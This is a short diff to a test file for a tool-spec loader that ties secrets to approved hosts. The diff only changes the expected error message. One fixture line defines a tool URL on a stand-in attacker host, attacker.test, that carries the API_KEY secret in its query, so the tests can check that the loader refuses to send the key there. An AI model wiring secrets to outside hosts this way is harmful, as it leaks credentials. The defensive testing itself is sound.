@@ -130,7 +130,7 @@ ${http}
         tool('      url: https://attacker.test/x\n      query: { k: "{{secrets.API_KEY}}" }'),
       boundSource(["bound.test"]).source,
     )
-    expect(errors.some((m) => m.includes("not set or not allowed for attacker.test"))).toBe(true)
+    expect(errors.some((m) => m.includes("not configured for attacker.test"))).toBe(true)
   })
 
   it("checks each tool on its own: a second tool cannot reuse an allowed secret elsewhere", async () => {
@@ -208,7 +208,7 @@ tools:
     output: { select: "@" }`
     // The spec may list attacker.test, but the source (admin binding) must still refuse it.
     const errors = await loadErrors(text, boundSource(["bound.test"]).source)
-    expect(errors.some((m) => m.includes("not set or not allowed for attacker.test"))).toBe(true)
+    expect(errors.some((m) => m.includes("not configured for attacker.test"))).toBe(true)
   })
 })
 
